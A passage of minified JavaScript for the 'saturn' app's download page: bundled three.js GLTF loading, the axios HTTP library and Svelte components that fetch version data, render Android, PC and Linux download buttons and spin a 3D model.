                    for (var t, n = this, i = this.json, r = this.extensions, a = i.meshes[e], o = a.primitives, s = [], l = 0, c = o.length; l < c; l++) {
                        var u = void 0 === o[l].material ? (void 0 === (t = this.cache).DefaultMaterial && (t.DefaultMaterial = new Wa({ color: 16777215, emissive: 0, metalness: 1, roughness: 1, transparent: !1, depthTest: !0, side: 0 })), t.DefaultMaterial) : this.getDependency("material", o[l].material);
                        s.push(u)
                    }
                    return s.push(n.loadGeometries(o)), Promise.all(s).then((function(t) {
                        for (var i = t.slice(0, t.length - 1), s = t[t.length - 1], l = [], c = 0, u = s.length; c < u; c++) {
                            var h, d = s[c],
                                p = o[c],
                                f = i[c];
                            if (4 === p.mode || 5 === p.mode || 6 === p.mode || void 0 === p.mode) !0 !== (h = !0 === a.isSkinnedMesh ? new pa(d, f) : new Dn(d, f)).isSkinnedMesh || h.geometry.attributes.skinWeight.normalized || h.normalizeSkinWeights(), 5 === p.mode ? h.geometry = te(h.geometry, 1) : 6 === p.mode && (h.geometry = te(h.geometry, 2));
                            else if (1 === p.mode) h = new Da(d, f);
                            else if (3 === p.mode) h = new Ra(d, f);
                            else if (2 === p.mode) h = new Na(d, f);
                            else {
                                if (0 !== p.mode) throw new Error("THREE.GLTFLoader: Primitive mode unsupported: " + p.mode);
                                h = new za(d, f)
                            }
                            Object.keys(h.geometry.morphAttributes).length > 0 && Z(h, a), h.name = n.createUniqueName(a.name || "mesh_" + e), X(h, a), p.extensions && q(r, h, p), n.assignFinalMaterial(h), l.push(h)
                        }
                        if (1 === l.length) return l[0];
                        var m = new Kr;
                        for (c = 0, u = l.length; c < u; c++) m.add(l[c]);
                        return m
                    }))
                }, K.prototype.loadCamera = function(e) {
                    var t, n = this.json.cameras[e],
                        i = n[n.type];
                    if (i) return "perspective" === n.type ? t = new Bn(ue.radToDeg(i.yfov), i.aspectRatio || 1, i.znear || 1, i.zfar || 2e6) : "orthographic" === n.type && (t = new Do(-i.xmag, i.xmag, i.ymag, -i.ymag, i.znear, i.zfar)), n.name && (t.name = this.createUniqueName(n.name)), X(t, n), Promise.resolve(t);
                    console.warn("THREE.GLTFLoader: Missing camera parameters.")
                }, K.prototype.loadSkin = function(e) {
                    var t = this.json.skins[e],
                        n = { joints: t.joints };
                    return void 0 === t.inverseBindMatrices ? Promise.resolve(n) : this.getDependency("accessor", t.inverseBindMatrices).then((function(e) { return n.inverseBindMatrices = e, n }))
                }, K.prototype.loadAnimation = function(e) {
                    for (var t = this.json.animations[e], n = [], i = [], r = [], a = [], o = [], s = 0, l = t.channels.length; s < l; s++) {
                        var c = t.channels[s],
                            u = t.samplers[c.sampler],
                            h = c.target,
                            d = void 0 !== h.node ? h.node : h.id,
                            p = void 0 !== t.parameters ? t.parameters[u.input] : u.input,
                            f = void 0 !== t.parameters ? t.parameters[u.output] : u.output;
                        n.push(this.getDependency("node", d)), i.push(this.getDependency("accessor", p)), r.push(this.getDependency("accessor", f)), a.push(u), o.push(h)
                    }
                    return Promise.all([Promise.all(n), Promise.all(i), Promise.all(r), Promise.all(a), Promise.all(o)]).then((function(n) {
                        for (var i = n[0], r = n[1], a = n[2], o = n[3], s = n[4], l = [], c = 0, u = i.length; c < u; c++) {
                            var h = i[c],
                                d = r[c],
                                p = a[c],
                                f = o[c],
                                m = s[c];
                            if (void 0 !== h) {
                                var g;
                                switch (h.updateMatrix(), h.matrixAutoUpdate = !0, D[m.path]) {
                                    case D.weights:
                                        g = to;
                                        break;
                                    case D.rotation:
                                        g = io;
                                        break;
                                    default:
                                        g = ao
                                }
                                var v = h.name ? h.name : h.uuid,
                                    y = void 0 !== f.interpolation ? N[f.interpolation] : Q,
                                    _ = [];
                                D[m.path] === D.weights ? h.traverse((function(e) {!0 === e.isMesh && e.morphTargetInfluences && _.push(e.name ? e.name : e.uuid) })) : _.push(v);
                                var b = p.array;
                                if (p.normalized) {
                                    var w;
                                    if (b.constructor === Int8Array) w = 1 / 127;
                                    else if (b.constructor === Uint8Array) w = 1 / 255;
                                    else if (b.constructor == Int16Array) w = 1 / 32767;
                                    else {
                                        if (b.constructor !== Uint16Array) throw new Error("THREE.GLTFLoader: Unsupported output accessor component type.");
                                        w = 1 / 65535
                                    }
                                    for (var M = new Float32Array(b.length), T = 0, E = b.length; T < E; T++) M[T] = b[T] * w;
                                    b = M
                                }
                                for (T = 0, E = _.length; T < E; T++) { var S = new g(_[T] + "." + D[m.path], d.array, b, y); "CUBICSPLINE" === f.interpolation && (S.createInterpolant = function(e) { return new x(this.times, this.values, this.getValueSize() / 3, e) }, S.createInterpolant.isInterpolantFactoryMethodGLTFCubicSpline = !0), l.push(S) }
                            }
                        }
                        var L = t.name ? t.name : "animation_" + e;
                        return new oo(L, void 0, l)
                    }))
                }, K.prototype.loadNode = function(e) {
                    var t, n = this.json,
                        i = this.extensions,
                        r = this,
                        a = n.nodes[e],
                        o = a.name ? r.createUniqueName(a.name) : "";
                    return (t = [], void 0 !== a.mesh && t.push(r.getDependency("mesh", a.mesh).then((function(e) {
                        var t = r._getNodeRef(r.meshCache, a.mesh, e);
                        return void 0 !== a.weights && t.traverse((function(e) {
                            if (e.isMesh)
                                for (var t = 0, n = a.weights.length; t < n; t++) e.morphTargetInfluences[t] = a.weights[t]
                        })), t
                    }))), void 0 !== a.camera && t.push(r.getDependency("camera", a.camera).then((function(e) { return r._getNodeRef(r.cameraCache, a.camera, e) }))), r._invokeAll((function(t) { return t.createNodeAttachment && t.createNodeAttachment(e) })).forEach((function(e) { t.push(e) })), Promise.all(t)).then((function(t) {
                        var n;
                        if ((n = !0 === a.isBone ? new fa : t.length > 1 ? new Kr : 1 === t.length ? t[0] : new _t) !== t[0])
                            for (var s = 0, l = t.length; s < l; s++) n.add(t[s]);
                        if (a.name && (n.userData.name = a.name, n.name = o), X(n, a), a.extensions && q(i, n, a), void 0 !== a.matrix) {
                            var c = new Ze;
                            c.fromArray(a.matrix), n.applyMatrix4(c)
                        } else void 0 !== a.translation && n.position.fromArray(a.translation), void 0 !== a.rotation && n.quaternion.fromArray(a.rotation), void 0 !== a.scale && n.scale.fromArray(a.scale);
                        return r.associations.set(n, { type: "nodes", index: e }), n
                    }))
                }, K.prototype.loadScene = function() {
                    function e(t, n, i, r) {
                        var a = i.nodes[t];
                        return r.getDependency("node", t).then((function(e) {
                            return void 0 === a.skin ? e : r.getDependency("skin", a.skin).then((function(e) { for (var n = [], i = 0, a = (t = e).joints.length; i < a; i++) n.push(r.getDependency("node", t.joints[i])); return Promise.all(n) })).then((function(n) {
                                return e.traverse((function(e) {
                                    if (e.isMesh) {
                                        for (var i = [], r = [], a = 0, o = n.length; a < o; a++) {
                                            var s = n[a];
                                            if (s) {
                                                i.push(s);
                                                var l = new Ze;
                                                void 0 !== t.inverseBindMatrices && l.fromArray(t.inverseBindMatrices.array, 16 * a), r.push(l)
                                            } else console.warn('THREE.GLTFLoader: Joint "%s" could not be found.', t.joints[a])
                                        }
                                        e.bind(new va(i, r), e.matrixWorld)
                                    }
                                })), e
                            }));
                            var t
                        })).then((function(t) {
                            n.add(t);
                            var o = [];
                            if (a.children)
                                for (var s = a.children, l = 0, c = s.length; l < c; l++) {
                                    var u = s[l];
                                    o.push(e(u, t, i, r))
                                }
                            return Promise.all(o)
                        }))
                    }
                    return function(t) {
                        var n = this.json,
                            i = this.extensions,
                            r = this.json.scenes[t],
                            a = new Kr;
                        r.name && (a.name = this.createUniqueName(r.name)), X(a, r), r.extensions && q(i, a, r);
                        for (var o = r.nodes || [], s = [], l = 0, c = o.length; l < c; l++) s.push(e(o[l], a, n, this));
                        return Promise.all(s).then((function() { return a }))
                    }
                }(), e
            }(),
            hs = function(e, t) { return function() { for (var n = new Array(arguments.length), i = 0; i < n.length; i++) n[i] = arguments[i]; return e.apply(t, n) } },
            ds = Object.prototype.toString;

        function ps(e) { return "[object Array]" === ds.call(e) }

        function fs(e) { return void 0 === e }

        function ms(e) { return null !== e && "object" == typeof e }

        function gs(e) { if ("[object Object]" !== ds.call(e)) return !1; var t = Object.getPrototypeOf(e); return null === t || t === Object.prototype }

        function vs(e) { return "[object Function]" === ds.call(e) }

        function ys(e, t) {
            if (null != e)
                if ("object" != typeof e && (e = [e]), ps(e))
                    for (var n = 0, i = e.length; n < i; n++) t.call(null, e[n], n, e);
                else
                    for (var r in e) Object.prototype.hasOwnProperty.call(e, r) && t.call(null, e[r], r, e)
        }
        var xs = {
            isArray: ps,
            isArrayBuffer: function(e) { return "[object ArrayBuffer]" === ds.call(e) },
            isBuffer: function(e) { return null !== e && !fs(e) && null !== e.constructor && !fs(e.constructor) && "function" == typeof e.constructor.isBuffer && e.constructor.isBuffer(e) },
            isFormData: function(e) { return "undefined" != typeof FormData && e instanceof FormData },
            isArrayBufferView: function(e) { return "undefined" != typeof ArrayBuffer && ArrayBuffer.isView ? ArrayBuffer.isView(e) : e && e.buffer && e.buffer instanceof ArrayBuffer },
            isString: function(e) { return "string" == typeof e },
            isNumber: function(e) { return "number" == typeof e },
            isObject: ms,
            isPlainObject: gs,
            isUndefined: fs,
            isDate: function(e) { return "[object Date]" === ds.call(e) },
            isFile: function(e) { return "[object File]" === ds.call(e) },
            isBlob: function(e) { return "[object Blob]" === ds.call(e) },
            isFunction: vs,
            isStream: function(e) { return ms(e) && vs(e.pipe) },
            isURLSearchParams: function(e) { return "undefined" != typeof URLSearchParams && e instanceof URLSearchParams },
            isStandardBrowserEnv: function() { return ("undefined" == typeof navigator || "ReactNative" !== navigator.product && "NativeScript" !== navigator.product && "NS" !== navigator.product) && void 0 !== window && void 0 !== document },
            forEach: ys,
            merge: function e() {
                var t = {};

                function n(n, i) { gs(t[i]) && gs(n) ? t[i] = e(t[i], n) : gs(n) ? t[i] = e({}, n) : ps(n) ? t[i] = n.slice() : t[i] = n }
                for (var i = 0, r = arguments.length; i < r; i++) ys(arguments[i], n);
                return t
            },
            extend: function(e, t, n) { return ys(t, (function(t, i) { e[i] = n && "function" == typeof t ? hs(t, n) : t })), e },
            trim: function(e) { return e.replace(/^\s*/, "").replace(/\s*$/, "") },
            stripBOM: function(e) { return 65279 === e.charCodeAt(0) && (e = e.slice(1)), e }
        };

        function _s(e) { return encodeURIComponent(e).replace(/%3A/gi, ":").replace(/%24/g, "$").replace(/%2C/gi, ",").replace(/%20/g, "+").replace(/%5B/gi, "[").replace(/%5D/gi, "]") }
        var bs = function(e, t, n) {
            if (!t) return e;
            var i;
            if (n) i = n(t);
            else if (xs.isURLSearchParams(t)) i = t.toString();
            else {
                var r = [];
                xs.forEach(t, (function(e, t) { null != e && (xs.isArray(e) ? t += "[]" : e = [e], xs.forEach(e, (function(e) { xs.isDate(e) ? e = e.toISOString() : xs.isObject(e) && (e = JSON.stringify(e)), r.push(_s(t) + "=" + _s(e)) }))) })), i = r.join("&")
            }
            if (i) { var a = e.indexOf("#"); - 1 !== a && (e = e.slice(0, a)), e += (-1 === e.indexOf("?") ? "?" : "&") + i }
            return e
        };

        function ws() { this.handlers = [] }
        ws.prototype.use = function(e, t) { return this.handlers.push({ fulfilled: e, rejected: t }), this.handlers.length - 1 }, ws.prototype.eject = function(e) { this.handlers[e] && (this.handlers[e] = null) }, ws.prototype.forEach = function(e) { xs.forEach(this.handlers, (function(t) { null !== t && e(t) })) };
        var Ms = ws,
            Ts = function(e, t, n) { return xs.forEach(n, (function(n) { e = n(e, t) })), e },
            Es = function(e) { return !(!e || !e.__CANCEL__) },
            Ss = function(e, t) { xs.forEach(e, (function(n, i) { i !== t && i.toUpperCase() === t.toUpperCase() && (e[t] = n, delete e[i]) })) },
            Ls = function(e, t, n, i, r) { return function(e, t, n, i, r) { return e.config = t, n && (e.code = n), e.request = i, e.response = r, e.isAxiosError = !0, e.toJSON = function() { return { message: this.message, name: this.name, description: this.description, number: this.number, fileName: this.fileName, lineNumber: this.lineNumber, columnNumber: this.columnNumber, stack: this.stack, config: this.config, code: this.code } }, e }(new Error(e), t, n, i, r) },
            As = xs.isStandardBrowserEnv() ? {
                write: function(e, t, n, i, r, a) {
                    var o = [];
                    o.push(e + "=" + encodeURIComponent(t)), xs.isNumber(n) && o.push("expires=" + new Date(n).toGMTString()), xs.isString(i) && o.push("path=" + i), xs.isString(r) && o.push("domain=" + r), !0 === a && o.push("secure"), document.cookie = o.join("; ")
                },
                read: function(e) { var t = document.cookie.match(new RegExp("(^|;\\s*)(" + e + ")=([^;]*)")); return t ? decodeURIComponent(t[3]) : null },
                remove: function(e) { this.write(e, "", Date.now() - 864e5) }
            } : { write: function() {}, read: function() { return null }, remove: function() {} },
            Rs = ["age", "authorization", "content-length", "content-type", "etag", "expires", "from", "host", "if-modified-since", "if-unmodified-since", "last-modified", "location", "max-forwards", "proxy-authorization", "referer", "retry-after", "user-agent"],
            Ps = xs.isStandardBrowserEnv() ? function() {
                var e, t = /(msie|trident)/i.test(navigator.userAgent),
                    n = document.createElement("a");

                function i(e) { var i = e; return t && (n.setAttribute("href", i), i = n.href), n.setAttribute("href", i), { href: n.href, protocol: n.protocol ? n.protocol.replace(/:$/, "") : "", host: n.host, search: n.search ? n.search.replace(/^\?/, "") : "", hash: n.hash ? n.hash.replace(/^#/, "") : "", hostname: n.hostname, port: n.port, pathname: "/" === n.pathname.charAt(0) ? n.pathname : "/" + n.pathname } }
                return e = i(window.location.href),
                    function(t) { var n = xs.isString(t) ? i(t) : t; return n.protocol === e.protocol && n.host === e.host }
            }() : function() { return !0 },
            Ds = { "Content-Type": "application/x-www-form-urlencoded" };

        function Ns(e, t) {!xs.isUndefined(e) && xs.isUndefined(e["Content-Type"]) && (e["Content-Type"] = t) }
        var Is, Os = {
            adapter: (("undefined" != typeof XMLHttpRequest || "undefined" != typeof process && "[object process]" === Object.prototype.toString.call(process)) && (Is = function(e) {
                return new Promise((function(t, n) {
                    var i = e.data,
                        r = e.headers;
                    xs.isFormData(i) && delete r["Content-Type"];
                    var a = new XMLHttpRequest;
                    if (e.auth) {
                        var o = e.auth.username || "",
                            s = e.auth.password ? unescape(encodeURIComponent(e.auth.password)) : "";
                        r.Authorization = "Basic " + btoa(o + ":" + s)
                    }
                    var l, c, u = (l = e.baseURL, c = e.url, l && !/^([a-z][a-z\d\+\-\.]*:)?\/\//i.test(c) ? function(e, t) { return t ? e.replace(/\/+$/, "") + "/" + t.replace(/^\/+/, "") : e }(l, c) : c);
                    if (a.open(e.method.toUpperCase(), bs(u, e.params, e.paramsSerializer), !0), a.timeout = e.timeout, a.onreadystatechange = function() {
                            if (a && 4 === a.readyState && (0 !== a.status || a.responseURL && 0 === a.responseURL.indexOf("file:"))) {
                                var i, r, o, s, l, c = "getAllResponseHeaders" in a ? (i = a.getAllResponseHeaders(), l = {}, i ? (xs.forEach(i.split("\n"), (function(e) {
                                        if (s = e.indexOf(":"), r = xs.trim(e.substr(0, s)).toLowerCase(), o = xs.trim(e.substr(s + 1)), r) {
                                            if (l[r] && Rs.indexOf(r) >= 0) return;
                                            l[r] = "set-cookie" === r ? (l[r] ? l[r] : []).concat([o]) : l[r] ? l[r] + ", " + o : o
                                        }
                                    })), l) : l) : null,
                                    u = { data: e.responseType && "text" !== e.responseType ? a.response : a.responseText, status: a.status, statusText: a.statusText, headers: c, config: e, request: a };
                                ! function(e, t, n) {
                                    var i = n.config.validateStatus;
                                    n.status && i && !i(n.status) ? t(Ls("Request failed with status code " + n.status, n.config, null, n.request, n)) : e(n)
                                }(t, n, u), a = null
                            }
                        }, a.onabort = function() { a && (n(Ls("Request aborted", e, "ECONNABORTED", a)), a = null) }, a.onerror = function() { n(Ls("Network Error", e, null, a)), a = null }, a.ontimeout = function() {
                            var t = "timeout of " + e.timeout + "ms exceeded";
                            e.timeoutErrorMessage && (t = e.timeoutErrorMessage), n(Ls(t, e, "ECONNABORTED", a)), a = null
                        }, xs.isStandardBrowserEnv()) {
                        var h = (e.withCredentials || Ps(u)) && e.xsrfCookieName ? As.read(e.xsrfCookieName) : void 0;
                        h && (r[e.xsrfHeaderName] = h)
                    }
                    if ("setRequestHeader" in a && xs.forEach(r, (function(e, t) { void 0 === i && "content-type" === t.toLowerCase() ? delete r[t] : a.setRequestHeader(t, e) })), xs.isUndefined(e.withCredentials) || (a.withCredentials = !!e.withCredentials), e.responseType) try { a.responseType = e.responseType } catch (t) { if ("json" !== e.responseType) throw t }
                    "function" == typeof e.onDownloadProgress && a.addEventListener("progress", e.onDownloadProgress), "function" == typeof e.onUploadProgress && a.upload && a.upload.addEventListener("progress", e.onUploadProgress), e.cancelToken && e.cancelToken.promise.then((function(e) { a && (a.abort(), n(e), a = null) })), i || (i = null), a.send(i)
                }))
            }), Is),
            transformRequest: [function(e, t) { return Ss(t, "Accept"), Ss(t, "Content-Type"), xs.isFormData(e) || xs.isArrayBuffer(e) || xs.isBuffer(e) || xs.isStream(e) || xs.isFile(e) || xs.isBlob(e) ? e : xs.isArrayBufferView(e) ? e.buffer : xs.isURLSearchParams(e) ? (Ns(t, "application/x-www-form-urlencoded;charset=utf-8"), e.toString()) : xs.isObject(e) ? (Ns(t, "application/json;charset=utf-8"), JSON.stringify(e)) : e }],
            transformResponse: [function(e) {
                if ("string" == typeof e) try { e = JSON.parse(e) } catch (e) {}
                return e
            }],
            timeout: 0,
            xsrfCookieName: "XSRF-TOKEN",
            xsrfHeaderName: "X-XSRF-TOKEN",
            maxContentLength: -1,
            maxBodyLength: -1,
            validateStatus: function(e) { return e >= 200 && e < 300 },
            headers: { common: { Accept: "application/json, text/plain, */*" } }
        };
        xs.forEach(["delete", "get", "head"], (function(e) { Os.headers[e] = {} })), xs.forEach(["post", "put", "patch"], (function(e) { Os.headers[e] = xs.merge(Ds) }));
        var Hs = Os;

        function Us(e) { e.cancelToken && e.cancelToken.throwIfRequested() }
        var Fs = function(e) { return Us(e), e.headers = e.headers || {}, e.data = Ts(e.data, e.headers, e.transformRequest), e.headers = xs.merge(e.headers.common || {}, e.headers[e.method] || {}, e.headers), xs.forEach(["delete", "get", "head", "post", "put", "patch", "common"], (function(t) { delete e.headers[t] })), (e.adapter || Hs.adapter)(e).then((function(t) { return Us(e), t.data = Ts(t.data, t.headers, e.transformResponse), t }), (function(t) { return Es(t) || (Us(e), t && t.response && (t.response.data = Ts(t.response.data, t.response.headers, e.transformResponse))), Promise.reject(t) })) },
            zs = function(e, t) {
                t = t || {};
                var n = {},
                    i = ["url", "method", "data"],
                    r = ["headers", "auth", "proxy", "params"],
                    a = ["baseURL", "transformRequest", "transformResponse", "paramsSerializer", "timeout", "timeoutMessage", "withCredentials", "adapter", "responseType", "xsrfCookieName", "xsrfHeaderName", "onUploadProgress", "onDownloadProgress", "decompress", "maxContentLength", "maxBodyLength", "maxRedirects", "transport", "httpAgent", "httpsAgent", "cancelToken", "socketPath", "responseEncoding"],
                    o = ["validateStatus"];

                function s(e, t) { return xs.isPlainObject(e) && xs.isPlainObject(t) ? xs.merge(e, t) : xs.isPlainObject(t) ? xs.merge({}, t) : xs.isArray(t) ? t.slice() : t }

                function l(i) { xs.isUndefined(t[i]) ? xs.isUndefined(e[i]) || (n[i] = s(void 0, e[i])) : n[i] = s(e[i], t[i]) }
                xs.forEach(i, (function(e) { xs.isUndefined(t[e]) || (n[e] = s(void 0, t[e])) })), xs.forEach(r, l), xs.forEach(a, (function(i) { xs.isUndefined(t[i]) ? xs.isUndefined(e[i]) || (n[i] = s(void 0, e[i])) : n[i] = s(void 0, t[i]) })), xs.forEach(o, (function(i) { i in t ? n[i] = s(e[i], t[i]) : i in e && (n[i] = s(void 0, e[i])) }));
                var c = i.concat(r).concat(a).concat(o),
                    u = Object.keys(e).concat(Object.keys(t)).filter((function(e) { return -1 === c.indexOf(e) }));
                return xs.forEach(u, l), n
            };

        function Bs(e) { this.defaults = e, this.interceptors = { request: new Ms, response: new Ms } }
        Bs.prototype.request = function(e) {
            "string" == typeof e ? (e = arguments[1] || {}).url = arguments[0] : e = e || {}, (e = zs(this.defaults, e)).method ? e.method = e.method.toLowerCase() : this.defaults.method ? e.method = this.defaults.method.toLowerCase() : e.method = "get";
            var t = [Fs, void 0],
                n = Promise.resolve(e);
            for (this.interceptors.request.forEach((function(e) { t.unshift(e.fulfilled, e.rejected) })), this.interceptors.response.forEach((function(e) { t.push(e.fulfilled, e.rejected) })); t.length;) n = n.then(t.shift(), t.shift());
            return n
        }, Bs.prototype.getUri = function(e) { return e = zs(this.defaults, e), bs(e.url, e.params, e.paramsSerializer).replace(/^\?/, "") }, xs.forEach(["delete", "get", "head", "options"], (function(e) { Bs.prototype[e] = function(t, n) { return this.request(zs(n || {}, { method: e, url: t, data: (n || {}).data })) } })), xs.forEach(["post", "put", "patch"], (function(e) { Bs.prototype[e] = function(t, n, i) { return this.request(zs(i || {}, { method: e, url: t, data: n })) } }));
        var Gs = Bs;

        function ks(e) { this.message = e }
        ks.prototype.toString = function() { return "Cancel" + (this.message ? ": " + this.message : "") }, ks.prototype.__CANCEL__ = !0;
        var Vs = ks;

        function Ws(e) {
            if ("function" != typeof e) throw new TypeError("executor must be a function.");
            var t;
            this.promise = new Promise((function(e) { t = e }));
            var n = this;
            e((function(e) { n.reason || (n.reason = new Vs(e), t(n.reason)) }))
        }
        Ws.prototype.throwIfRequested = function() { if (this.reason) throw this.reason }, Ws.source = function() { var e; return { token: new Ws((function(t) { e = t })), cancel: e } };
        var js = Ws;

        function qs(e) {
            var t = new Gs(e),
                n = hs(Gs.prototype.request, t);
            return xs.extend(n, Gs.prototype, t), xs.extend(n, t), n
        }
        var Xs = qs(Hs);
        Xs.Axios = Gs, Xs.create = function(e) { return qs(zs(Xs.defaults, e)) }, Xs.Cancel = Vs, Xs.CancelToken = js, Xs.isCancel = Es, Xs.all = function(e) { return Promise.all(e) }, Xs.spread = function(e) { return function(t) { return e.apply(null, t) } }, Xs.isAxiosError = function(e) { return "object" == typeof e && !0 === e.isAxiosError };
        var Ys = Xs,
            Zs = Xs;
        Ys.default = Zs;
        var Js = Ys;

        function Ks(e, t, n) { const i = e.slice(); return i[7] = t[n], i }

        function $s(e, t, n) { const i = e.slice(); return i[7] = t[n], i }

        function Qs(e) {
            let t, n, i, r, a, p, g, v, y, linuxHeader, linuxVersion, linuxDownloads, b = e[0].android.latest + "",
                w = e[0].pc.latest + "",
                L = e[0].linux.latest + "",
                M = e[0].android.versions[0].downloads,
                T = [],
                E = e[0].pc.versions[0].downloads,
                S = [],
                A = e[0].linux.versions[0].downloads,
                D = [];

            for (let t = 0; t < M.length; t += 1) {
                T[t] = el($s(e, M, t));
            }

            for (let t = 0; t < E.length; t += 1) {
                S[t] = tl(Ks(e, E, t));
            }

            for (let t = 0; t < A.length; t += 1) {
                D[t] = ll(Ks(e, A, t));
            }

            return {
                c() {
                    t = document.createElement("h3");
                    n = document.createTextNode("Mobile latest: ");
                    i = h(b);
                    r = document.createElement("div");
                    r.className = "download-buttons"; // Add class here
                    for (let e = 0; e < T.length; e += 1) T[e].c();
                    a = document.createElement("h3");
                    p = document.createTextNode("PC latest: ");
                    g = h(w);
                    v = document.createElement("div");
                    v.className = "download-buttons"; // Add class here
                    for (let e = 0; e < S.length; e += 1) S[e].c();
                    y = document.createElement("h3");
                    linuxHeader = document.createTextNode("Linux latest: ");
                    linuxVersion = h(L);
                    linuxDownloads = document.createElement("div");
                    linuxDownloads.className = "download-buttons"; // Add class here
                    for (let e = 0; e < D.length; e += 1) D[e].c();
                },
                m(e, l) {
                    e.insertBefore(t, l);
                    t.appendChild(n);
                    t.appendChild(i);

                    e.insertBefore(r, l);
                    for (let e = 0; e < T.length; e += 1) T[e].m(r, null);

                    e.insertBefore(a, l);
                    a.appendChild(p);
                    a.appendChild(g);

                    e.insertBefore(v, l);
                    for (let e = 0; e < S.length; e += 1) S[e].m(v, null);

                    e.insertBefore(y, l);
                    y.appendChild(linuxHeader);
                    y.appendChild(linuxVersion);

                    e.insertBefore(linuxDownloads, l);
                    for (let e = 0; e < D.length; e += 1) D[e].m(linuxDownloads, null);
                },
                p(e, t) {
                    if (1 & t && b !== (b = e[0].android.latest + "")) {
                        i.data = b;
                    }
                    if (1 & t) {
                        let n;
                        for (M = e[0].android.versions[0].downloads, n = 0; n < M.length; n += 1) {
                            const i = $s(e, M, n);
                            T[n] ? T[n].p(i, t) : (T[n] = el(i), T[n].c(), T[n].m(r, null));
                        }
                        for (; n < T.length; n += 1) T[n].d(1);
                        T.length = M.length;
                    }
                    if (1 & t && w !== (w = e[0].pc.latest + "")) {
                        g.data = w;
                    }
                    if (1 & t) {
                        let n;
                        for (E = e[0].pc.versions[0].downloads, n = 0; n < E.length; n += 1) {
                            const i = Ks(e, E, n);
                            S[n] ? S[n].p(i, t) : (S[n] = tl(i), S[n].c(), S[n].m(v, null));
                        }
                        for (; n < S.length; n += 1) S[n].d(1);
                        S.length = E.length;
                    }
                    if (1 & t && L !== (L = e[0].linux.latest + "")) {
                        linuxVersion.data = L;
                    }
                    if (1 & t) {
                        let n;
                        for (A = e[0].linux.versions[0].downloads, n = 0; n < A.length; n += 1) {
                            const i = Ks(e, A, n);
                            D[n] ? D[n].p(i, t) : (D[n] = ll(i), D[n].c(), D[n].m(linuxDownloads, null));
                        }
                        for (; n < D.length; n += 1) D[n].d(1);
                        D.length = A.length;
                    }
                },
                d(e) {
                    e && t.parentNode.removeChild(t);
                    e && r.parentNode.removeChild(r);
                    c(T, e);
                    e && a.parentNode.removeChild(a);
                    e && v.parentNode.removeChild(v);
                    c(S, e);
                    e && y.parentNode.removeChild(y);
                    e && linuxDownloads.parentNode.removeChild(linuxDownloads);
                    c(D, e);
                }
            };
        }




        function el(e) {
            let t, n, i, r, a, c, d = e[7].version + "";

            function g() { return e[2](e[7]) }
            return { c() { t = u("div"), n = h(""), i = h(d), r = h(""), f(t, "class", "glow-on-hover") }, m(e, l) { s(e, t, l), o(t, n), o(t, i), o(t, r), a || (c = p(t, "click", g), a = !0) }, p(t, n) { e = t, 1 & n && d !== (d = e[7].version + "") && m(i, d) }, d(e) { e && l(t), a = !1, c() } }
        }

        function tl(e) {
            let t, n, i, r, a, c = e[7].version + "";

            function d() { return e[3](e[7]) }
            return { c() { t = u("div"), n = h("Download "), i = h(c), f(t, "class", "glow-on-hover") }, m(e, l) { s(e, t, l), o(t, n), o(t, i), r || (a = p(t, "click", d), r = !0) }, p(t, n) { e = t, 1 & n && c !== (c = e[7].version + "") && m(i, c) }, d(e) { e && l(t), r = !1, a() } }
        }

        function ll(e) {
            let t, n, i, r, a, c, d = e[7].version + "";

            function g() {
                return e[2](e[7]);
            }
            return {
                c() {
                    t = document.createElement("div");
                    n = document.createTextNode("");
                    i = document.createTextNode(d);
                    r = document.createTextNode("");
                    t.className = "glow-on-hover";
                    t.addEventListener("click", g);
                },
                m(e, l) {
                    e.insertBefore(t, l);
                    t.appendChild(n);
                    t.appendChild(i);
                    t.appendChild(r);
                },
                p(t, n) {
                    e = t, 1 & n && d !== (d = e[7].version + "") && (i.data = d);
                },
                d(e) {
                    e && t.removeEventListener("click", g);
                    e && t.parentNode.removeChild(t);
                }
            };
        }


        function nl(t) { let n, r, a, c, h, m, g, v, y, x, _, b, w, M, T, E = t[0] && Qs(t); return { c() { n = u("main"), r = u("div"), a = u("div"), c = d(), h = u("h1"), h.textContent = "saturn", m = d(), g = u("h2"), g.textContent = "freezer back from the dead", v = d(), y = u("div"), x = u("div"), x.textContent = "All Downloads", _ = d(), b = u("div"), b.textContent = "Source Code", w = d(), E && E.c(), f(a, "id", "3dmodel"), f(x, "class", "glow-on-hover"), f(b, "class", "glow-on-hover"), f(y, "class", "download-buttons"), f(r, "class", "title-container") }, m(e, i) { s(e, n, i), o(n, r), o(r, a), o(r, c), o(r, h), o(r, m), o(r, g), o(r, v), o(r, y), o(y, x), o(y, _), o(y, b), o(r, w), E && E.m(r, null), M || (T = [p(a, "click", t[1]), p(x, "click", al), p(b, "click", rl)], M = !0) }, p(e, [t]) { e[0] ? E ? E.p(e, t) : (E = Qs(e), E.c(), E.m(r, null)) : E && (E.d(1), E = null) }, i: e, o: e, d(e) { e && l(n), E && E.d(), M = !1, i(T) } } }

        function il(e) { window.location.href = e.links[0].url }

        function rl() { window.location.href = "https://github.com/SaturnMusic/" }

        function al() { window.location.href = "https://t.me/SaturnReleases/" }

        function ol(e, t, n) {
            var i = null;
            Js.get("/api/versions", { responseType: "json" }).then((e => { n(0, i = e.data) }));
            let r = .01,
                a = !1;
            return function y(e) {
                (function() { if (!g) throw new Error("Function called outside component initialization"); return g })().$$.on_mount.push(e)
            }((() => {
                ! function() {
                    let e = new na;
                    e.background = new Wt(592137);
                    let t = new Bn(40, 1, 1, 5e3);
                    t.rotation.y = .25 * Math.PI, t.position.x = 1e3, t.position.y = 0, t.position.z = 1e3;
                    let n = new ta({ antialias: !0 });
                    n.outputEncoding = ne, n.setSize(200, 200), document.getElementById("3dmodel").appendChild(n.domElement);
                    let i = new Oo(197379, 100);
                    e.add(i);
                    let o, s = new us,
                        l = 0;

                    function c() { l += r, o.rotation.set(1, l, 1), n.render(e, t), requestAnimationFrame(c), a && (t.position.y -= 10) }
                    s.load("freezer.gltf", (function(t) { o = t.scene.children[0], o.scale.set(50, 50, 50), o.rotation.set(1, l, 1), console.log(o), e.add(t.scene), c() }))
                }()
            })), [i, function() { r += .01, console.log(r), r > 1 && (a = !0) }, e => il(e), e => il(e)]
        }
        return new class extends class {
            $destroy() {
                ! function(e, t) {
                    const n = e.$$;
                    null !== n.fragment && (i(n.on_destroy), n.fragment && n.fragment.d(1), n.on_destroy = n.fragment = null, n.ctx = [])
                }(this), this.$destroy = e
            }
            $on(e, t) { const n = this.$$.callbacks[e] || (this.$$.callbacks[e] = []); return n.push(t), () => { const e = n.indexOf(t); - 1 !== e && n.splice(e, 1) } }
            $set(e) {
                var t;
